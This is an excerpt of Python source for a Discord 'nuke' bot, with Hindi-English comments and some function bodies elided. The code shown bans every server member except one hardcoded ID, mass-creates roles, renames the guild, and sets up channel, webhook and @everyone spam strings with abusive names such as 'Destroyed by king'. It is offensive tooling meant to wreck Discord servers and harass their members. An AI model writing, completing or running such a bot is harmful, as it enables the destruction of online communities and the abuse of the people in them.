...
import os
import random 
from discord import Webhook   # ← SIRF YEH RAKHO
from discord import Permissions
import sys  # ← YEH LINE ADD KI (1)

# Command line se token lo (yeh changes kiye hain)
if len(sys.argv) < 2:
    print("Koi token nahi diya gaya! Bot band ho raha hai.")
    sys.exit(1)

token = sys.argv[1]  # ← YAHAN TOKEN COMMAND LINE SE AAYEGA (2)

client = commands.Bot(command_prefix="x", intents = discord.Intents.all())

# (NOTE: neeche jo hardcoded token tha, use hata diya)

CHANNEL_NAMES = ["Destroyed by king", "fucked by king", "King xD"]
MESSAGE_CONTENTS = ["@everyone king xD @here " ]
WEBHOOK_NAMES = ['Destroyed by king ','king.ontop','king xD']
...
async def ban(ctx):
        ...
        for member in ctx.guild.members:
         if member.id != 872029483341856789:
...
@client.event
async def on_ready():
  await client.change_presence(activity=discord.Game(name= "KiNGx.EXE"))
...
async def roles(ctx):
  ...
  for i in range(1, 250):
    try:
      await ctx.guild.create_role(name=f"KiNG OP")
      print("Created Roles")
    except:
...
async def wizz(ctx, amount=50):
  await ctx.guild.edit(name="KiNG ON TOP")
...
async def help(ctx, *args):
    ...
    embed.set_footer(text=f'KiNG.InI')

    await ctx.send(embed=embed)

# Yahan pehle hardcoded token tha, ab use hata diya hai
client.run(token)
